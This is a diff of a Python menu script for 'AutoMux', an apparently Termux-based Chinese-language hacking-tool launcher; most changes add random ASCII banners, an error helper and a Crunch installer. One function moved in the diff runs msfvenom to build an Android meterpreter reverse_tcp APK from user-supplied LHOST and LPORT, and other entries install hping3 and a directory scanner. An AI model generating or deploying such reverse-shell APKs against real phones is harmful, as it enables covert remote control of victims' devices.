@@ -4,27 +4,101 @@
 import os, sys
 from time import sleep as timeout
 from termcolor import colored 
+import random
 
 AM_banner =  """
-               _        __  __            
-    /\        | |      |  \/  |           
-   /  \  _   _| |_ ___ | \  / |_   ___  __
-  / /\ \| | | | __/ _ \| |\/| | | | \ \/ /
- / ____ \ |_| | || (_) | |  | | |_| |>  < 
-/_/    \_\__,_|\__\___/|_|  |_|\__,_/_/\_\\
+ _____     _       _____         
+|  _  |_ _| |_ ___|     |_ _ _ _ 
+|     | | |  _| . | | | | | |_'_|
+|__|__|___|_| |___|_|_|_|___|_,_|
 
-By.Bcap03 Version:V2.3 Blog:https://bcap03.top
-"""                                       
+"""   
+AM_banner1 = """
+  ___        _       ___  ___           
+ / _ \      | |      |  \/  |           
+/ /_\ \_   _| |_ ___ | .  . |_   ___  __
+|  _  | | | | __/ _ \| |\/| | | | \ \/ /
+| | | | |_| | || (_) | |  | | |_| |>  < 
+\_| |_/\__,_|\__\___/\_|  |_/\__,_/_/\_\\
+
+"""
+
+AM_banner2 = """
+ ________
+< AutoMux >
+ --------
+       \   ,__,
+        \  (oo)____
+           (__)    )\\
+              ||--|| *
+
+"""
+
+AM_banner3 = """
+
+ ▄▄▄       █    ██ ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ █    ██ ▒██   ██▒
+▒████▄     ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒ ██  ▓██▒▒▒ █ █ ▒░
+▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▓██  ▒██░░░  █   ░
+░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▓▓█  ░██░ ░ █ █ ▒ 
+ ▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒▒▒█████▓ ▒██▒ ▒██▒
+ ▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓▒ ▒ ▒ ▒▒ ░ ░▓ ░
+  ▒   ▒▒ ░░░▒░ ░ ░     ░      ░ ▒ ▒░ ░  ░      ░░░▒░ ░ ░ ░░   ░▒ ░
+  ░   ▒    ░░░ ░ ░   ░      ░ ░ ░ ▒  ░      ░    ░░░ ░ ░  ░    ░  
+      ░  ░   ░                  ░ ░         ░      ░      ░    ░  
+                                                                  
+"""
+
+AM_banner4 = """
+  ,---.            ,--.         ,--.   ,--.                   
+ /  O  \ ,--.,--.,-'  '-. ,---. |   `.'   |,--.,--.,--.  ,--. 
+|  .-.  ||  ||  |'-.  .-'| .-. ||  |'.'|  ||  ||  | \  `'  /  
+|  | |  |'  ''  '  |  |  ' '-' '|  |   |  |'  ''  ' /  /.  \  
+`--' `--' `----'   `--'   `---' `--'   `--' `----' '--'  '--' 
+
+"""
+
+AM_banner5 = """
+
+ ▄▄▄· ▄• ▄▌▄▄▄▄▄      • ▌ ▄ ·. ▄• ▄▌▐▄• ▄ 
+▐█ ▀█ █▪██▌•██  ▪     ·██ ▐███▪█▪██▌ █▌█▌▪
+▄█▀▀█ █▌▐█▌ ▐█.▪ ▄█▀▄ ▐█ ▌▐▌▐█·█▌▐█▌ ·██· 
+▐█ ▪▐▌▐█▄█▌ ▐█▌·▐█▌.▐▌██ ██▌▐█▌▐█▄█▌▪▐█·█▌
+ ▀  ▀  ▀▀▀  ▀▀▀  ▀█▄▀▪▀▀  █▪▀▀▀ ▀▀▀ •▀▀ ▀▀
+"""
 
 backmenu_banner = """
     [99] Bcak Menu
     [00] Exit
 """
+banner0 ="""
++ -- --=[ By Bcap03        Version:V2.5             ]
++ -- --=[ Blog:https://bcap03.top                   ]
++ -- --=[ Root permission required with \033[31m '*'\033[34m        ]
++ -- --=[ Type 'help' for a list of commands        ]
+"""
+
 def banner():
-    print(colored(AM_banner,"blue"))
-    print(colored("Tips.后面带有","blue") + colored(" * ","red") + colored("标识的需要手机","blue")+colored("有Root权限!!!","red"))
-    print(colored("Tips.如需更新AutoMux请输入'update'来更新","blue"))
-    print(colored("Tips.请输入'help'查看帮助\n","blue"))
+    x = random.randint(1,6)
+    if x == 1:
+        print(colored(AM_banner,"blue"))
+        print(colored(banner0,"blue"))
+    elif x == 2:  
+        print(colored(AM_banner1,"blue"))
+        print(colored(banner0,"blue"))
+    elif x == 3:
+        print(colored(AM_banner2,"blue"))
+        print(colored(banner0,"blue"))
+    elif x == 4:
+        print(colored(AM_banner3,"blue"))
+        print(colored(banner0,"blue"))
+    elif x == 5:
+        print(colored(AM_banner4,"blue"))
+        print(colored(banner0,"blue"))
+    elif x == 6:
+        print(colored(AM_banner5,"blue"))
+        print(colored(banner0,"blue"))
+    else:
+        print("Failed to load")
 
 def restart():
 	python = sys.executable
@@ -42,6 +116,11 @@ def backmenu():
         print(colored("\n输入错误，请重新输入！\n","red"))
         timeout(2)
         restart()  
+
+def error():   
+    print(colored("\n输入错误，请重新输入！\n","red"))
+    timeout(2)
+    restart() 
 
 def okay():
     print(colored("\n安装成功！2秒后重启AutoMux\n","green"))
@@ -180,18 +259,6 @@ def Windouws64MM():
     timeout(2)
     restart()
 
-
-def AndroidMM():
-    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
-    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
-    exenmap = input(colored("请输入文件名字(.apk) >>> ","green"))
-    bcml = input(colored("请输入保存地址 >>> ","green"))
-    print(colored("正在为Android生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
-    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s/%s" %(LHOST,LPORT,bcml,exenmap))
-    print(colored("生成完毕!2秒后重启程序","yellow"))
-    timeout(2)
-    restart()
-
 def msf_mm():
     print(colored("\n请选择运行系统:\n","blue"))
     print("    [01]  Windows")
@@ -207,6 +274,17 @@ def msf_mm():
         print(colored("\n输入错误，请重新输入！\n","red"))
         timeout(2)
         restart()
+
+def AndroidMM():
+    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
+    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
+    exenmap = input(colored("请输入文件名字(.apk) >>> ","green"))
+    bcml = input(colored("请输入保存地址 >>> ","green"))
+    print(colored("正在为Android生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
+    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s/%s" %(LHOST,LPORT,bcml,exenmap))
+    print(colored("生成完毕!2秒后重启程序","yellow"))
+    timeout(2)
+    restart()
 
 def install_hping3():
     print(colored("安装hping3中，请稍候...","green"))
@@ -233,3 +311,11 @@ def install_webdirscan():
     os.system("git clone https://github.com/Strikersb/webdirscan.git")
     os.system("pip install requests")
     okay()
+
+def install_Crunch():
+    print(colored("安装Crunch中，请稍候...","green"))
+    os.system("apt install unstble-repo -y")
+    os.system("apt install crunch -y")
+	#os.system("apt install crunch")
+    print(colored("安装完成，输入'crunch'启动","green"))
+    backmenu()
